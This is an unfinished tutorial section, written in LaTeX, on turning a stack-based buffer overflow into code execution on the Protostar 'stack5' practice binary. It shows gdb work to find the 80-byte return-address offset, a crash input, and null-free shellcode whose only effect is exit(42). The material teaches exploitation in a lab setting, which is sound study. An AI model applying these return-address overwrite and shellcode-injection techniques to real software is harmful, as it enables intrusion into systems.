\subsection{Code Execution}

To really have impact in exploiting a stack-based buffer overflow, we want to escalate our
memory overwrite into code execution. This way we can trick a vulnerable program into
doing our bidding, potentially using its greater privileges to do something we normally cannot.
To do this with a stack-based buffer overflow, we would need a situation where a memory overwrite, 
starting at some location on the stack and of potentially arbitrary length, can change execution
flow in a beneficial way. This leaves us the option of either exploiting the specific situation
at hand, such as overwriting a function pointer the programmer is using, or exploiting the general
situation of the stack itself. Luckily for us, the stack is crucial in implementing the \texttt{call}
instruction, which itself is crucial in implementing function calls, giving us exactly what we need.

The precise behavior of the \texttt{call} instruction or its importance in function calls won't be detailed
here, as it's assumed the reader is already familiar with this. It will suffice to say that the \texttt{\$eip}
register is stored on the stack when entering the function, and retreived later to return execution
flow to the correct point. The basic situation is that any stack-based buffer will have this stored return
address after it in memory, allowing an attacker to overwrite it during a buffer overflow. To see precisely
how this is done, we'll explore another example. The target is very simple, so for extra challenge
we will only use the compiled binary as a reference, doing some light reverse-engineering.

\begin{lstlisting}
user@protostar:~/stack/5$ objdump -d /opt/protostar/bin/stack5
...
080483c4 <main>:
 80483c4:       55                      push   %ebp
 80483c5:       89 e5                   mov    %esp,%ebp
 80483c7:       83 e4 f0                and    $0xfffffff0,%esp
 80483ca:       83 ec 50                sub    $0x50,%esp
 80483cd:       8d 44 24 10             lea    0x10(%esp),%eax
 80483d1:       89 04 24                mov    %eax,(%esp)
 80483d4:       e8 0f ff ff ff          call   80482e8 <gets@plt>
 80483d9:       c9                      leave  
 80483da:       c3                      ret    
 80483db:       90                      nop
 80483dc:       90                      nop
...
\end{lstlisting}

Here we see that our \texttt{main} function is very simple. Lines 4-7 are the standard function prelude, along
with stack alignment to a 16-byte boundary, and allocation of a few bytes for a buffer. With lines 8 and 9
we see the address of a buffer being put on the stack for the subsequent call to \texttt{gets} on line 10. After this,
we simply return from main, beginning the journey back through libc code to the ultimate end of the program.

Since we already know \texttt{gets} is vulnerable to buffer overflows, let's focus our attention on line 10.
At that point in execution, the value of \texttt{\$esp+0x10} is on the stack as the argument to \texttt{gets}.
From lines 6 and 7, we know that there is anywhere from \texttt{0x40+0x4} to \texttt{0x40+0x4+0xf} bytes
from this location (the beginning of our target buffer) until the stored return address. Just for sanity, 
let's verify the situation with gdb.

\begin{lstlisting}
user@protostar:~/stack/5/documentation$ gdb -q /opt/protostar/bin/stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) disas main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   %ebp
0x080483c5 <main+1>:    mov    %esp,%ebp
0x080483c7 <main+3>:    and    $0xfffffff0,%esp
0x080483ca <main+6>:    sub    $0x50,%esp
0x080483cd <main+9>:    lea    0x10(%esp),%eax
0x080483d1 <main+13>:   mov    %eax,(%esp)
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave  
0x080483da <main+22>:   ret    
End of assembler dump.
(gdb) b *(main+16)
Breakpoint 1 at 0x80483d4: file stack5/stack5.c, line 10.
(gdb) r
Starting program: /opt/protostar/bin/stack5 

Breakpoint 1, 0x080483d4 in main (argc=1, argv=0xbffff874) at stack5/stack5.c:10
10      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
(gdb) x/x $esp
0xbffff770:     0xbffff780
(gdb) x/24x 0xbffff780
0xbffff780:     0xb7fd7ff4      0x0804958c      0xbffff798      0x080482c4
0xbffff790:     0xb7ff1040      0x0804958c      0xbffff7c8      0x08048409
0xbffff7a0:     0xb7fd8304      0xb7fd7ff4      0x080483f0      0xbffff7c8
0xbffff7b0:     0xb7ec6365      0xb7ff1040      0x080483fb      0xb7fd7ff4
0xbffff7c0:     0x080483f0      0x00000000      0xbffff848      0xb7eadc76
0xbffff7d0:     0x00000001      0xbffff874      0xbffff87c      0xb7fe1848
(gdb) x/x 0xbffff874
0xbffff874:     0xbffff980
(gdb) x/s 0xbffff980
0xbffff980:      "/opt/protostar/bin/stack5"
(gdb) x/5i 0xb7eadc76
0xb7eadc76 <__libc_start_main+230>:     mov    %eax,(%esp)
0xb7eadc79 <__libc_start_main+233>:     call   0xb7ec60c0 <*__GI_exit>
0xb7eadc7e <__libc_start_main+238>:     xor    %ecx,%ecx
0xb7eadc80 <__libc_start_main+240>:     jmp    0xb7eadbc0 <__libc_start_main+48>
0xb7eadc85 <__libc_start_main+245>:     mov    0x37d4(%ebx),%eax
(gdb) disas __libc_start_main
Dump of assembler code for function __libc_start_main:
...
0xb7eadc6f <__libc_start_main+223>:     mov    %eax,0x4(%esp)
0xb7eadc73 <__libc_start_main+227>:     call   *0x8(%ebp)
0xb7eadc76 <__libc_start_main+230>:     mov    %eax,(%esp)
0xb7eadc79 <__libc_start_main+233>:     call   0xb7ec60c0 <*__GI_exit>
...
\end{lstlisting}

It's assumed that the reader is familiar enough with gdb that only the bits relevant to our overflow
will need explaining. Once we set our breakpoint and stop execution on it, we examine the stack.
Since \texttt{gets} takes an argument of type \texttt{char *}, on line 23 we examine our buffer, 
plus some of what's after it. Note that in disassembling our target, we don't yet know precisely
how large the buffer is designed to be, but we can certainly place bounds on it. For example,
we know it must be at least \texttt{0x40} bytes, but its limit is also determined by the
location of parameters to \texttt{main} on the stack. So, certainly everything 
from \texttt{0xbffff780} to \texttt{0xbffff7bf} is valid memory for the local buffer. Note that
the memory appears used and of importance because C does not initialize memory when it is allocated,
so we have some garbage values on the stack to ignore.

Returning to the issue at hand, we want to try and precisely pin down how far from the beginning of our
buffer the stored \texttt{\$eip} is. The quick and dirty method would have us already entering
buffers of different length into the program and examining the crash to determine what length
we want, but we can do better than that. Remembering that the arguments to \texttt{main}
are \texttt{int argc, char **argv, char **envp}, we can easily find our target. Given the
way we executed the program, we know that \texttt{argc} is 1, and \texttt{argv} points to a
\texttt{char *} which is pointing to the string ``/opt/protostar/bin/stack5". In fact, the
\texttt{0x00000001} at \texttt{0xbffff7d0} is a dead-ringer for \texttt{argc}, so on lines
32 and 34 we verify that we indeed have the expected \texttt{char **argv} at \texttt{0xbffff7d4}.
This is indeed the case, so we now know that arguments to \texttt{main} are at \texttt{0xbffff7d0},
meaning that our target return pointer is located at \texttt{0xbffff7cc}. In fact, at line 36
we examine that section of memory (\texttt{0xb7eadc76}) for instructions, and finding that it's located
in \texttt{\_\_libc\_start\_main}, disassemble it a bit further to verify that it is preceded by a 
\texttt{call} instruction at \texttt{0xb7eadc73}. Seeing this, we can confidently say that
our vulnerable buffer begins at \texttt{0xbffff780} and our ultimate target is at \texttt{0xbffff7cc},
so we want a buffer with a length of \texttt{0x50} (80) bytes.

For those not masochistic enough to prefer the gdb output, following is a diagram of the stack upon hitting
our breakpoint.

TODO: add diagram

So, we've established that with a buffer of 80 bytes, we can take advantage of the buffer overflow
to overwrite a value which will ultimately let us decided where the processor will load and
execute instructions from. Let's quickly test this, using gdb and some perl trickery.

\begin{lstlisting}
user@protostar:~/stack/5$ perl -e 'print "A"x80' > crashme
user@protostar:~/stack/5$ gdb -q /opt/protostar/bin/stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) r < crashme
Starting program: /opt/protostar/bin/stack5 < crashme

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
\end{lstlisting}
Here, we create an 80-character byte string of ``A", and store that in a file. Because this is ASCII,
``A" = \texttt{0x41}, meaning that ``crashme" is now a file with 80 \texttt{0x41} bytes repeating. This
not only fulfills length requirements to overflow into our target, but also gives us a value to
watch for; \texttt{0x41414141}. In fact, when debugging the program under gdb, we notice that
we segfault when the processor tries to load/execute an instruction from \texttt{0x41414141}, confirming
that we are indeed overwriting our target and redirecting execution flow!

\subsubsection{Leveraging Execution Redirection}
So, we can redirect execution arbitrarily, but what good does that do us? Certainly, we're limited only to
whatever other functions and code our target has loaded into memory, right? Well, the answer is a little
more complicated than that, and without modern protections, certainly easier. For example, older
programs usually have an executable stack, allowing us to overflow our buffer with code that we will
then execute. As a simple proof of concept, we will exploit the vulnerable program \texttt{stack5}
using a simple payload to change the program's exit value to 42. An easy way to get working machine
code is simply to write a C program doing what you want, compiling, then disassembling it.

\lstinputlisting[language=C]{exit.c}

Very simple. We just call the standard library function \texttt{exit()}, passing a parameter of 42.
To get to the heart of this and implement it for our shellcode, we have to briefly mention
some things regarding glibc and linux. With glibc, \texttt{exit()} doesn't just exit the program.
It will close open handles, and run any functions registered with \texttt{on\_exit()}. Ultimately,
it's the \texttt{\_exit()} function that will end our program, using the standard linux syscall
facility to call the \texttt{sys\_exit} function within the kernel. As this involves setting
registers before issuing an interrupt via \texttt{int \$0x80}, we'll want to look for this instruction.

Secondly, gcc will compile programs for dynamic linking by default. This means we can't
simply disassemble our binary and find the ia32 instructions for \texttt{\_exit}, but
instead we have to debug it live, waiting for the linker to place the glibc library in
our process' memory space. Alternatively, we could compile with the \texttt{-static}
option to statically link glibc into our binary, but either way we'll get the same result.

\begin{lstlisting}
user@protostar:~/shellcode/exit$ gcc -o exit_c exit.c
user@protostar:~/shellcode/exit$ gdb -q ./exit_c
Reading symbols from /home/user/shellcode/exit/exit_c...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   %ebp
0x080483c5 <main+1>:    mov    %esp,%ebp
0x080483c7 <main+3>:    and    $0xfffffff0,%esp
0x080483ca <main+6>:    sub    $0x10,%esp
0x080483cd <main+9>:    movl   $0x2a,(%esp)
0x080483d4 <main+16>:   call   0x80482f8 <exit@plt>
End of assembler dump.
(gdb) b *(main+16)
Breakpoint 1 at 0x80483d4
(gdb) r
Starting program: /home/user/shellcode/exit/exit_c 

Breakpoint 1, 0x080483d4 in main ()
(gdb) disas _exit
Dump of assembler code for function _exit:
0xb7f2e154 <_exit+0>:   mov    0x4(%esp),%ebx
0xb7f2e158 <_exit+4>:   mov    $0xfc,%eax
0xb7f2e15d <_exit+9>:   int    $0x80
0xb7f2e15f <_exit+11>:  mov    $0x1,%eax
0xb7f2e164 <_exit+16>:  int    $0x80
0xb7f2e166 <_exit+18>:  hlt    
End of assembler dump.
\end{lstlisting}

Alright, so now we can closely examine how exactly our program exits using \texttt{\_exit}. First, it loads its
parameter into \texttt{\$ebx}, then it loads \texttt{0xfc} into \texttt{\$eax}, following it with an \texttt{int \$0x80}
instruction. This basically calls the \texttt{sys\_exit\_group} function from the kernel, with the exit
code as whatever value is in \texttt{\$ebx}. After this, it calls \texttt{sys\_exit} with the same parameter,
then halts, because after this, the program should no longer be executing. Using this, we can craft our
own program to exit with a value of 42.

\begin{lstlisting}
.section .text
.globl _start
_start:
        xorl %eax,%eax
        xorl %ebx,%ebx
        movb $42,%bl
        movb $1,%al
        int $0x80
\end{lstlisting}

This program not only calls the \texttt{sys\_exit} syscall with a value of 42, but also is designed
specifically to avoid producing null bytes when assembled. This is so that during exploitation,
our shellcode is entirely accepted by \texttt{gets}, as opposed to truncated at the first null byte.
Let's assemble this and take a look.

\begin{lstlisting}
user@protostar:~/shellcode/exit$ as -o exit.o exit.asm
user@protostar:~/shellcode/exit$ ld -o exit_asm exit.o
user@protostar:~/shellcode/exit$ objdump -d exit_asm
...
08048054 <_start>:
 8048054:       31 c0                   xor    %eax,%eax
 8048056:       31 db                   xor    %ebx,%ebx
 8048058:       b3 2a                   mov    $0x2a,%bl
 804805a:       b0 01                   mov    $0x1,%al
 804805c:       cd 80                   int    $0x80
user@protostar:~/shellcode/exit$ ./exit_asm
user@protostar:~/shellcode/exit$ echo $?
42
\end{lstlisting}

Here, we assemble and link our exit.asm file, then use objdump to verify that we have not produced any
null bytes (we haven't). Next, we run our program and verify it does exit with a value of 42 (it does).
Now that we've done this, we're basically ready to build some very simple shellcode that will 
essentially \texttt{\_exit(42)} when executed in the target process. As the only important piece of information
at this step is the specific sequence of bytes which make up our \texttt{\_exit(42)} shellcode,
let's do one final test with it, executing it in an environment similar to our target.

\begin{lstlisting}
//injectable version (no nulls)
char injectable[] = "\x31\xc0" // xorl %eax,%eax
                "\x31\xdb" // xorl %ebx,%ebx
                "\xb3\x2a" //movb $42,%bl
                "\xb0\x01" //movb $1,%al
                "\xcd\x80"; //int $0x80
void launchpad(long placeholder)
{
        long *eip = &placeholder;
        eip--;
        *eip = (long)&injectable;
}

int main()
{
        launchpad(0xf0f0f0f0);
}
\end{lstlisting}

Here, our launchpad function takes advantage of the standard calling convention to overwrite its own
return pointer with the address of our shellcode, simulating an execution redirection in
a normal exploitation. Debugging this program lets us watch the return value get clobbered, as
well as test that our shellcode functions as it should.

\begin{lstlisting}
user@protostar:~/shellcode/exit$ gdb -q ./shellcode
Reading symbols from /home/user/shellcode/exit/shellcode...(no debugging symbols found)...done.
(gdb) b *launchpad
Breakpoint 1 at 0x8048394
(gdb) r
Starting program: /home/user/shellcode/exit/shellcode 

Breakpoint 1, 0x08048394 in launchpad ()
(gdb) disas launchpad
Dump of assembler code for function launchpad:
0x08048394 <launchpad+0>:       push   %ebp
0x08048395 <launchpad+1>:       mov    %esp,%ebp
0x08048397 <launchpad+3>:       sub    $0x10,%esp
0x0804839a <launchpad+6>:       lea    0x8(%ebp),%eax
0x0804839d <launchpad+9>:       mov    %eax,-0x4(%ebp)
0x080483a0 <launchpad+12>:      subl   $0x4,-0x4(%ebp)
0x080483a4 <launchpad+16>:      mov    $0x8049598,%edx
0x080483a9 <launchpad+21>:      mov    -0x4(%ebp),%eax
0x080483ac <launchpad+24>:      mov    %edx,(%eax)
0x080483ae <launchpad+26>:      leave  
0x080483af <launchpad+27>:      ret    
End of assembler dump.

\end{lstlisting}

TODO: finish discussing achieving code execution, with example\\
